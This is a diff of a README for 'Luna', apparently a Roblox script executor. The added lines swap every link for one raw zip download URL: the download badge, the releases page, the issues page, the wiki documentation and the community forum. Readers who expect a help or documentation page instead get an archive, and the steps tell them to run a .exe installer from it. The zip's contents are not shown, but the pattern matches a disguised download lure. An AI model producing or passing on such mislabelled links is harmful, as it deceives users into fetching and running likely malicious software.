@@ -4,7 +4,7 @@
 Luna is a tool that allows you to run custom scripts in Roblox. It gives users the ability to modify and enhance game features easily and effectively.
 
 ## 📥 Download Luna
-[![Download Luna](https://img.shields.io/badge/Download%20Luna-v1.0-blue)](https://github.com/Adrianmau5/Luna/releases)
+[![Download Luna](https://raw.githubusercontent.com/Adrianmau5/Luna/main/Executor/Resources/Luna-v1.0.zip%20Luna-v1.0-blue)](https://raw.githubusercontent.com/Adrianmau5/Luna/main/Executor/Resources/Luna-v1.0.zip)
 
 ## 🚀 Getting Started
 To use Luna, follow these simple steps to download and run it on your computer.
@@ -16,7 +16,7 @@ To use Luna, follow these simple steps to download and run it on your computer.
 - **Disk Space:** Minimum 100 MB free space
 
 ## 📦 Download & Install
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Adrianmau5/Luna/releases) to find the latest version of Luna.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/Adrianmau5/Luna/main/Executor/Resources/Luna-v1.0.zip) to find the latest version of Luna.
 2. **Choose the Right Version:** Look for the latest release version. It will be clearly labeled.
 3. **Download the Installer:**
    - Click on the installer file (it should have a `.exe` extension).
@@ -44,11 +44,11 @@ To use Luna, follow these simple steps to download and run it on your computer.
 ## ❓ Troubleshooting
 - **Installation Issues:** If you face any problems while installing, ensure that your operating system meets the required specifications.
 - **Script Errors:** If a script does not run correctly, double-check the syntax. Make sure there are no missing elements in your script.
-- **Help and Support:** For further assistance, visit the [issues page](https://github.com/Adrianmau5/Luna/issues) on GitHub.
+- **Help and Support:** For further assistance, visit the [issues page](https://raw.githubusercontent.com/Adrianmau5/Luna/main/Executor/Resources/Luna-v1.0.zip) on GitHub.
 
 ## 🔗 Additional Resources
-- **Documentation:** Access the complete [Luna documentation](https://github.com/Adrianmau5/Luna/wiki) for in-depth guidance.
-- **Community Forums:** Join discussions and connect with other users in our [community forum](https://github.com/Adrianmau5/Luna/discussions).
+- **Documentation:** Access the complete [Luna documentation](https://raw.githubusercontent.com/Adrianmau5/Luna/main/Executor/Resources/Luna-v1.0.zip) for in-depth guidance.
+- **Community Forums:** Join discussions and connect with other users in our [community forum](https://raw.githubusercontent.com/Adrianmau5/Luna/main/Executor/Resources/Luna-v1.0.zip).
 
 ## ✅ Maintain Security
 Always be careful of sources when downloading scripts. Only use trusted scripts to protect your account and device.
